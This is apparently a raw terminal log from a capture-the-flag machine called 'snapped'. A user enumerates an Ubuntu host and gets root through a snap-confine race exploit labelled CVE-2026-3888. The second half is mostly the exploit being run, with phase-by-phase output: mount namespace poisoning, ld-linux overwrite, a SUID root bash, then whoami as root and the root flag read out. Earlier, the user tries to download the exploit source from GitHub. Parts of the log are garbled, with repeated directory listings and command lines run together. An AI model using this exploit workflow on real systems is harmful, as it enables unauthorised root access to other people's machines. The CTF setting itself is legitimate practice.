: ESCOB-rw-rw-r-- 1 jonathan jonathan    112 Mar 20 12:09 fe547fea3a41b43a38975d292a2b19c7-le64.cache-7
: ESCOB
: ESCOB./snap/snapd-desktop-integration/common/.cache/gio-modules:
: ESCOBtotal 32
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 5 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB-rw-rw-r-- 1 jonathan jonathan  196 Mar 18 17:14 giomodule.cache
: ESCOBlrwxrwxrwx 1 jonathan jonathan  107 Mar 18 17:14 libdconfsettings.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gio/modules/libdconfsettings.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  113 Mar 18 17:14 libgioenvironmentproxy.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gio/modules/libgioenvironmentproxy.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  107 Mar 18 17:14 libgiognomeproxy.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gio/modules/libgiognomeproxy.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  103 Mar 18 17:14 libgiognutls.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gio/modules/libgiognutls.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  105 Mar 18 17:14 libgiolibproxy.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gio/modules/libgiolibproxy.so
: ESCOB
: ESCOB./snap/snapd-desktop-integration/common/.cache/immodules:
: ESCOBtotal 80
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 5 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBlrwxrwxrwx 1 jonathan jonathan  111 Mar 18 17:14 im-am-et.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-3.0/3.0.0/immodules/im-am-et.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  114 Mar 18 17:14 im-broadway.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-3.0/3.0.0/immodules/im-broadway.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  113 Mar 18 17:14 im-cedilla.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-3.0/3.0.0/immodules/im-cedilla.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  123 Mar 18 17:14 im-cyrillic-translit.so -> /snap/snapd-desktop-integration/178/gno: ESCOBlrwxrwxrwx 1 jonathan jonathan  113 Mar 18 17:14 libgioenvironmentproxy.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gio/modules/libgioenvironmentproxy.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  107 Mar 18 17:14 libgiognomeproxy.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gio/modules/libgiognomeproxy.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  103 Mar 18 17:14 libgiognutls.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gio/modules/libgiognutls.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  105 Mar 18 17:14 libgiolibproxy.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gio/modules/libgiolibproxy.so
: ESCOB
: ESCOB./snap/snapd-desktop-integration/common/.cache/immodules:
: ESCOBtotal 80
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 5 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBlrwxrwxrwx 1 jonathan jonathan  111 Mar 18 17:14 im-am-et.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-3.0/3.0.0/immodules/im-am-et.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  114 Mar 18 17:14 im-broadway.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-3.0/3.0.0/immodules/im-broadway.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  113 Mar 18 17:14 im-cedilla.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-3.0/3.0.0/immodules/im-cedilla.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  123 Mar 18 17:14 im-cyrillic-translit.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-3.0/3.0.0/immodules/im-cyrillic-translit.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  111 Mar 18 17:14 im-fcitx.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-3.0/3.0.0/immodules/im-fcitx.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  110 Mar 18 17:14 im-ibus.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-3.0/3.0.0/immodules/im-ibus.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  115 Mar 18 17:14 im-inuktitut.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-3.0/3.0.0/immodules/im-inuktitut.so
: ESCOBlrwxrwxrwx 1 jonathan jonathan  109 Mar 18 17:14 im-ipa.so -> /snap/snapd-desktop-integration/178/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-3.0/3.0.0/immodules/im-ipa.so
: ESCOB-rw-rw-r-- 1 jonathan jonathan 5217 Mar 18 17:14 immodules.cache
    . /etc/bash_completion
  fi
fi
jonathan@snapped:~$ ls -la
total 76
drwxr-x--- 15 jonathan jonathan 4096 Mar 20 12:28 .
drwxr-xr-x  3 root     root     4096 Mar 20 11:38 ..
-rw-r--r--  1 root     jonathan    0 Mar 20 12:28 .bash_history
-rw-r--r--  1 jonathan jonathan  220 Mar 31  2024 .bash_logout
-rw-r--r--  1 jonathan jonathan 3771 Mar 31  2024 .bashrc
drwx------  9 jonathan jonathan 4096 Mar 20 11:38 .cache
drwx------ 12 jonathan jonathan 4096 Mar 20 11:38 .config
drwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Desktop
drwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Documents
drwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Downloads
drwx------  4 jonathan jonathan 4096 Mar 20 11:38 .local
drwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Music
drwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Pictures
-rw-r--r--  1 jonathan jonathan  807 Mar 31  2024 .profile
drwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Public
drwx------  3 jonathan jonathan 4096 Mar 20 11:38 snap
drwx------  2 jonathan jonathan 4096 Mar 20 11:38 .ssh
drwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Templates
-rw-r-----  1 root     jonathan   33 Apr  4 20:52 user.txt
drwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Videos
jonathan@snapped:~$ ls .local
share  state
jonathan@snapped:~$ ls .local/share/
applications  evolution  flatpak  gnome-settings-daemon  gnome-shell  gvfs-metadata  ibus-table  icc  keyrings  nautilus  session_migration-ubuntu  sounds
jonathan@snapped:~$ ls .local/share/applications/
jonathan@snapped:~$ ls .local/share/ecplications/
ls: cannot access '.local/share/ec': No such file or directory
jonathan@snapped:~$ ls .local/share/evolution/
addressbook  calendar  mail  memos  tasks
jonathan@snapped:~$ ls .local/share/evolution/mail/
trash
jonathan@snapped:~$ ls .local/share/evolution/mail/trash/
jonathan@snapped:~$ ls .local/share/evolution/mail/trash/ -la
total 8
drwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
drwxrwxr-x 3 jonathan jonathan 4096 Mar 20 11:38 ..
jonathan@snapped:~$ cat .profile re/evolution/mail/trash/ -la
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
jonathan@snapped:~$ ls -laR | less
jonathan@snapped:~$ cd .cache
jonathan@snapped:~/.cache$ ls
event-sound-cache.tdb.e011a86f2822466f81227135c3c90a6a.x86_64-pc-linux-gnu  evolution  gstreamer-1.0  ibus  ibus-table  mesa_shader_cache  motd.legal-displayed  tracker3  update-manager-core
jonathan@snapped:~/.cache$ cd tracker3/
jonathan@snapped:~/.cache/tracker3$ ls
files
jonathan@snapped:~/.cache/tracker3$ cd files/
jonathan@snapped:~/.cache/tracker3/files$ l
errors/                                                                      http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23FileSystem.db  last-crawl.txt
first-index.txt                                                              http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23Pictures.db    meta.db
http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23Audio.db      http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23Software.db    no-need-mtime-check.txt
http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23Documents.db  http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23Video.db       ontologies.gvdb
jonathan@snapped:~/.cache/tracker3/files$ cat first-index.txt
3.7.1jonathan@snapped:~/.cache/tracker3/files$ cat last-crawl.txt |less
jonathan@snapped:~/.cache/tracker3/files$ ss -pluntcrawl.txt |less
Netid             State              Recv-Q              Send-Q                                              Local Address:Port                            Peer Address:Port             Process
udp               UNCONN             0                   0                                                         0.0.0.0:5353                                 0.0.0.0:*
udp               UNCONN             0                   0                                                         0.0.0.0:34057                                0.0.0.0:*
udp               UNCONN             0                   0                                                      127.0.0.54:53                                   0.0.0.0:*
udp               UNCONN             0                   0                                                   127.0.0.53%lo:53                                   0.0.0.0:*
udp               UNCONN             0                   0                                                   10.129.18.211:68                                   0.0.0.0:*
udp               UNCONN             0                   0                                                            [::]:5353                                    [::]:*
udp               UNCONN             0                   0                                                            [::]:40277                                   [::]:*
udp               UNCONN             0                   0                                [dead:beef::2a1d:b2ee:b02d:cc63]:546                                     [::]:*
udp               UNCONN             0                   0                                 [fe80::8017:f4f:4c36:3de0]%eth0:546                                     [::]:*
tcp               LISTEN             0                   511                                                       0.0.0.0:80                                   0.0.0.0:*
tcp               LISTEN             0                   4096                                                      0.0.0.0:22                                   0.0.0.0:*
tcp               LISTEN             0                   4096                                                   127.0.0.54:53                                   0.0.0.0:*
tcp               LISTEN             0                   4096                                                    127.0.0.1:9000                                 0.0.0.0:*
tcp               LISTEN             0                   4096                                                127.0.0.53%lo:53                                   0.0.0.0:*
tcp               LISTEN             0                   4096                                                    127.0.0.1:631                                  0.0.0.0:*
tcp               LISTEN             0                   4096                                                         [::]:22                                      [::]:*
tcp               LISTEN             0                   4096                                                        [::1]:631                                     [::]:*
jonathan@snapped:~/.cache/tracker3/files$ curl http://127.0.0.1:9000
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <link href="./favicon.ico" rel="icon">
  <link href="./favicon-32x32.png" rel="icon" type="image/png" sizes="32x32">
  <meta content="width=device-width,initial-scale=1.0,user-scalable=0" name="viewport">

  <!-- PWA Manifest -->
  <link rel="manifest" href="./manifest.json">

  <!-- PWA Meta Tags -->
  <meta name="theme-color" content="#ffffff">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <meta name="apple-mobile-web-app-title" content="Nginx UI">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-config" content="./browserconfig.xml">

  <!-- Apple Touch Icons -->
  <link rel="apple-touch-icon" sizes="192x192" href="./pwa-192x192.png">
  <link rel="apple-touch-icon" sizes="512x512" href="./pwa-512x512.png">

  <style>
    body {
      height: auto !important;
      min-height: 100%;
    }

    body.dark {
      background-color: #141414;
      color: #fff;
    }

    #app {
      height: 100vh;
    }
  </style>
  <title>Nginx UI</title>
  <script type="module" crossorigin src="./assets/index-DoHxQupa.js"></script>
  <link rel="stylesheet" crossorigin href="./assets/index-Cjd4fVAL.css">
</head>

<body>
  <div id="app"></div>
</body>

</html>jonathan@snapped:~/.cache/tracker3/files$ curl http://127.0.0.1:6310
<!DOCTYPE HTML>
<html>
  <head>
    <link rel="stylesheet" href="/cups.css" type="text/css">
    <link rel="shortcut icon" href="/apple-touch-icon.png" type="image/png">
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=9">
    <meta name="viewport" content="width=device-width">
    <title>Home - CUPS 2.4.7</title>
  </head>
  <body>
    <div class="cups-header">
      <ul>
	<li><a href="https://openprinting.github.io/cups/" target="_blank">OpenPrinting CUPS</a></li>
	<li><a class="active" href="/">Home</a></li>
	<li><a href="/admin">Administration</a></li>
	<li><a href="/classes/">Classes</a></li>
	<li><a href="/help/">Help</a></li>
	<li><a href="/jobs/">Jobs</a></li>
	<li><a href="/printers/">Printers</a></li>
      </ul>
    </div>
    <div class="cups-body">
      <div class="row">
	<h1>OpenPrinting CUPS 2.4.7</h1>
	<p>The standards-based, open source printing system developed by <a class="jumbolink" href="https://openprinting.github.io/" target="_blank">OpenPrinting</a> for Linux® and other Unix®-like operating systems. CUPS uses <a href="https://www.pwg.org/ipp/everywhere.html" target="_blank">IPP Everywhere™</a> to support printing to local and network printers.</p>
      </div>
      <div class="row">
	<div class="thirds">
	  <h2>CUPS for Users</h2>
	  <p><a href="help/overview.html">Overview of CUPS</a></p>
	  <p><a href="help/options.html">Command-Line Printing and Options</a></p>
	</div>
	<div class="thirds">
	  <h2>CUPS for Administrators</h2>
	  <p><a href="help/admin.html">Adding Printers and Classes</a></p>
	  <p><a href="help/policies.html">Managing Operation Policies</a></p>
	  <p><a href="help/network.html">Using Network Printers</a></p>
	  <p><a href="help/firewalls.html">Firewalls</a></p>
	  <p><a href="help/man-cupsd.conf.html">cupsd.conf Reference</a></p>
	</div>
	<div class="thirds">
	  <h2>CUPS for Developers</h2>
	  <p><a href="help/cupspm.html">CUPS Programming Manual</a></p>
	  <p><a href="help/api-filter.html">Filter and Backend Programming</a></p>
	</div>
      </div>
    </div>
    <div class="cups-footer">Copyright &copy; 2021-2023 OpenPrinting. All rights reserved.</div>
  </body>
</html>
jonathan@snapped:~/.cache/tracker3/files$ cd ~
jonathan@snapped:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  user.txt  Videos
jonathan@snapped:~$ snap version
snap    2.63.1+24.04
snapd   2.63.1+24.04
series  16
ubuntu  24.04
kernel  6.17.0-19-generic
jonathan@snapped:~$ git clone https://github.com/nomaisthere/CVE-2026-3888.git                              https://github.com/nomaisthere/CVE-2026-3888.git
Command 'git' not found, but can be installed with:
apt install git
Please ask your administrator.
jonathan@snapped:~$ snap list
Name                       Version          Rev    Tracking         Publisher   Notes
bare                       1.0              5      latest/stable    canonical✓  base
core22                     20240731         1564   latest/stable    canonical✓  base
firefox                    129.0.2-1        4793   latest/stable/…  mozilla✓    -
firmware-updater           0+git.5007558    127    1/stable/…       canonical✓  -
gnome-42-2204              0+git.510a601    176    latest/stable/…  canonical✓  -
gtk-common-themes          0.1-81-g442e511  1535   latest/stable/…  canonical✓  -
snap-store                 0+git.e3dd562    1173   2/stable/…       canonical✓  -
snapd                      2.63             21759  latest/stable    canonical✓  snapd
snapd-desktop-integration  0.9              178    latest/stable/…  canonical✓  -
jonathan@snapped:~$ snap run firefox
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/local/share/doc /usr/local/share/doc none bind,ro 0 0): cannot open directory "/usr/local/share": permission denied
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/gimp/2.0/help /usr/share/gimp/2.0/help none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/gimp/2.0/help" because it would affect the host in "/var/lib/snapd"
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/gtk-doc /usr/share/gtk-doc none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/gtk-doc" because it would affect the host in "/var/lib/snapd"
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/javascript/jquery /usr/share/javascript/jquery none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/javascript/jquery" because it would affect the host in "/var/lib/snapd"
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/javascript/sphinxdoc /usr/share/javascript/sphinxdoc none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/javascript/sphinxdoc" because it would affect the host in "/var/lib/snapd"
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/libreoffice/help /usr/share/libreoffice/help none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/libreoffice/help" because it would affect the host in "/var/lib/snapd"
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/sphinx_rtd_theme /usr/share/sphinx_rtd_theme none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/sphinx_rtd_theme" because it would affect the host in "/var/lib/snapd"
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/xubuntu-docs /usr/share/xubuntu-docs none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/xubuntu-docs" because it would affect the host in "/var/lib/snapd"
Error: no DISPLAY environment variable specified
jonathan@snapped:~$ ls -a /tmp
.                                 systemd-private-256d1581a8f148858cfbe559c070350c-colord.service-tMpOA4                 systemd-private-256d1581a8f148858cfbe559c070350c-systemd-oomd.service-QmnwpC
..                                systemd-private-256d1581a8f148858cfbe559c070350c-fwupd.service-PpsHCj                  systemd-private-256d1581a8f148858cfbe559c070350c-systemd-resolved.service-hniKYv
dbus-3bEy4Hjn25                   systemd-private-256d1581a8f148858cfbe559c070350c-ModemManager.service-IPVy5f           systemd-private-256d1581a8f148858cfbe559c070350c-systemd-timesyncd.service-OhjkiF
.ICE-unix                         systemd-private-256d1581a8f148858cfbe559c070350c-polkit.service-ZjHhPa                 systemd-private-256d1581a8f148858cfbe559c070350c-upower.service-zG2T5a
nginx-ui-search-index-3480396750  systemd-private-256d1581a8f148858cfbe559c070350c-power-profiles-daemon.service-VWNPDT  VMwareDnD
nginx-ui.sock                     systemd-private-256d1581a8f148858cfbe559c070350c-switcheroo-control.service-z7SDyZ     .X11-unix
snap-private-tmp                  systemd-private-256d1581a8f148858cfbe559c070350c-systemd-logind.service-iiq8oD
jonathan@snapped:~$ curl https://github.com/nomaisthere/CVE-2026-3888/blob/main/src/librootshell.c                       https://github.com/nomaisthere/CVE-2026-3888/blob/main/src/librootshell.c -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: github.com
jonathan@snapped:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  user.txt  Videos
jonathan@snapped:~$ gcc
Command 'gcc' not found, but can be installed with:
apt install gcc
Please ask your administrator.
jonathan@snapped:~$ gcc
Command 'gcc' not found, but can be installed with:
apt install gcc
Please ask your administrator.
jonathan@snapped:~$ curl https://github.com/nomaisthere/CVE-2026-3888/blob/main/src/librootshell.c -O                    git clone https://github.com/nomaisthere/CVE-2026-3888.git                    curl http://127.0.0.1:9000       ls .local/share/evolution/mail/trash/ -lah/ -la              cat last-crawl.txt |less                    curl http://127.0.0.1:631 git clone https://github.com/nomaisthere/CVE-2026-3888.git                    curl https://github.com/nomaisthere/CVE-2026-3888/blob/main/src/librootshell.c -O                    curl https://github.com/nomaisthere/CVE-2026-3888/blob/main/src/librootshell.c -O                    git clone https://github.com/nomaisthere/CVE-2026-3888.git                    curl http://127.0.0.1:9000                    ls .local/share/evolution/mail/trash/ -la                    cat last-crawl.txt |less curl http://127.0.0.1:631                    git clone https://github.com/nomaisthere/CVE-2026-3888.git                   curl https://github.com/nomaisthere/CVE-2026-3888/blob/main/src/librootshell.c -O                    git clone https://github.com/nomaisthere/CVE-2026-3888.git                    curl http://127.0.0.1:9000                   lst user.txt
Desktop  Documents  Downloads  exploit_suid  firefox_2404.c  librootshell_suid.so  Music  Pictures  Public  snap  Templates  user.txt  Videos
jonathan@snapped:~$ ./exploit_suid ./librootshell_suid.so
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/./librootshell_suid.so (9152 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 8697

[Phase 2] Waiting for .snap deletion...
[+] .snap already gone!

[Phase 3] Destroying cached mount namespace...
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_onSKYJ//dev: No such file or directory
[+] Namespace destroyed.

[Phase 4] Setting up and running the race...
[*]   Working directory: /proc/8697/cwd
[*]   Building .snap and .exchange...
[*]   285 entries copied to exchange directory
[*]   Starting race...
[*]   Monitoring snap-confine (child PID 8716)...

[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
[-] Could not read poison PID from race_pid.txt
jonathan@snapped:~$ ./exploit_suid ./librootshell_suid.so
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/./librootshell_suid.so (9152 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 8742

[Phase 2] Waiting for .snap deletion...
[*] Polling (up to 30 days on stock Ubuntu).
[*] Hint: use -s to skip.
^C
jonathan@snapped:~$ ./exploit_suid ./librootshell_suid.so -s
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/./librootshell_suid.so (9152 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 8814

[Phase 2] Waiting for .snap deletion...
[*] --skip-wait: triggering cleanup...
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ====
Authentication is required to start 'systemd-tmpfiles-clean.service'.
Authenticating as: root
Password: ^C
jonathan@snapped:~$ ./exploit_suid ./librootshell_suid.so -s
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/./librootshell_suid.so (9152 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 8853

[Phase 2] Waiting for .snap deletion...
[*] --skip-wait: triggering cleanup...
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ====
Authentication is required to start 'systemd-tmpfiles-clean.service'.
Authenticating as: root
Password: ^C
jonathan@snapped:~$ ./exploit_suid ./librootshell_suid.so -s
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/./librootshell_suid.so (9152 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 8890

[Phase 2] Waiting for .snap deletion...
[*] Polling (up to 30 days on stock Ubuntu).
[*] Hint: use -s to skip.
^C
jonathan@snapped:~$ snap run firefox &
[1] 8988
jonathan@snapped:~$ Error: no DISPLAY environment variable specified

[1]+  Exit 1                  snap run firefox
jonathan@snapped:~$ snap list
Name                       Version          Rev    Tracking         Publisher   Notes
bare                       1.0              5      latest/stable    canonical✓  base
core22                     20240731         1564   latest/stable    canonical✓  base
firefox                    129.0.2-1        4793   latest/stable/…  mozilla✓    -
firmware-updater           0+git.5007558    127    1/stable/…       canonical✓  -
gnome-42-2204              0+git.510a601    176    latest/stable/…  canonical✓  -
gtk-common-themes          0.1-81-g442e511  1535   latest/stable/…  canonical✓  -
snap-store                 0+git.e3dd562    1173   2/stable/…       canonical✓  -
snapd                      2.63             21759  latest/stable    canonical✓  snapd
snapd-desktop-integration  0.9              178    latest/stable/…  canonical✓  -
jonathan@snapped:~$ snap run bare
error: cannot find app "bare" in "bare"
jonathan@snapped:~$ snap run core22
error: cannot find app "core22" in "core22"
jonathan@snapped:~$ snap run gnome-42-2204
error: cannot find app "gnome-42-2204" in "gnome-42-2204"
jonathan@snapped:~$ snap run snapd
error: cannot find app "snapd" in "snapd"
jonathan@snapped:~$ snap gtk-common-themes
error: unknown command "gtk-common-themes", see 'snap help'.
jonathan@snapped:~$ ./exploit_suid ./librootshell_suid.so
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/./librootshell_suid.so (9152 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 9132

[Phase 2] Waiting for .snap deletion...
[*] Polling (up to 30 days on stock Ubuntu).
[*] Hint: use -s to skip.
^C
jonathan@snapped:~$ ./exploit_suid ./librootshell_suid.so                    snapsnap-storen-themes
snapsnap-store: command not found
jonathan@snapped:~$ snap snap-store
error: unknown command "snap-store", see 'snap help'.
jonathan@snapped:~$ snap run snap-store

(snap-store:9193): Gtk-WARNING **: 22:41:03.614: cannot open display:
jonathan@snapped:~$ ./exploit_suid ./librootshell_suid.so
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/./librootshell_suid.so (9152 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 9316

[Phase 2] Waiting for .snap deletion...
[*] Polling (up to 30 days on stock Ubuntu).
[*] Hint: use -s to skip.
^C
jonathan@snapped:~$ snap run firefox
Error: no DISPLAY environment variable specified
jonathan@snapped:~$ set DISPLAY=false
jonathan@snapped:~$ snap run firefox
Error: no DISPLAY environment variable specified
jonathan@snapped:~$ ls -ld /tmp/snap-private-tmp*/*/tmp/.snap 2>/dev/null
jonathan@snapped:~$ ls -ld /tmp/snap-private-tmp*/*/tmp/.snap 2>/dev/null                    ./exploit_suid ./librootshell_suid.so
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/./librootshell_suid.so (9152 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 9563

[Phase 2] Waiting for .snap deletion...
[+] .snap already gone!

[Phase 3] Destroying cached mount namespace...
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_nQNWQZ//dev: No such file or directory
[+] Namespace destroyed.

[Phase 4] Setting up and running the race...
[*]   Working directory: /proc/9563/cwd
[*]   Building .snap and .exchange...
[*]   285 entries copied to exchange directory
[*]   Starting race...
[*]   Monitoring snap-confine (child PID 9583)...

[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
[*]   ld-linux in namespace: jonathan:jonathan 755
[+]   Poisoned namespace PID: 9583

[Phase 5] Injecting payload into poisoned namespace...
[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.
[*]   Planting busybox...
[*]   Writing escape script → /tmp/sh
[*]   Overwriting ld-linux-x86-64.so.2...
[+]   Payload injected.

[Phase 6] Triggering root via SUID snap-confine...
[*]   snap-confine → snap-confine (SUID trigger)
[*]   Exit status: 0

[Phase 7] Verifying...
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
[*] Cleaning up background processes...

================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
================================================================

bash-5.1# /var/snap/firefox/common/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
92efcb8327d1a4864e66fc0de681fc7c
bash-5.1# ss -plunt
Netid     State      Recv-Q     Send-Q                              Local Address:Port            Peer Address:Port     Process
udp       UNCONN     0          0                                         0.0.0.0:5353                 0.0.0.0:*         users:(("avahi-daemon",pid=1529,fd=12))
udp       UNCONN     0          0                                         0.0.0.0:34057                0.0.0.0:*         users:(("avahi-daemon",pid=1529,fd=14))
udp       UNCONN     0          0                                      127.0.0.54:53                   0.0.0.0:*         users:(("systemd-resolve",pid=695,fd=16))
udp       UNCONN     0          0                                   127.0.0.53%lo:53                   0.0.0.0:*         users:(("systemd-resolve",pid=695,fd=14))
udp       UNCONN     0          0                                   10.129.18.211:68                   0.0.0.0:*         users:(("dhcpcd",pid=1366,fd=7))
udp       UNCONN     0          0                                            [::]:5353                    [::]:*         users:(("avahi-daemon",pid=1529,fd=13))
udp       UNCONN     0          0                                            [::]:40277                   [::]:*         users:(("avahi-daemon",pid=1529,fd=15))
udp       UNCONN     0          0                [dead:beef::2a1d:b2ee:b02d:cc63]:546                     [::]:*         users:(("dhcpcd",pid=1354,fd=7))
udp       UNCONN     0          0                 [fe80::8017:f4f:4c36:3de0]%eth0:546                     [::]:*         users:(("dhcpcd",pid=1347,fd=7))
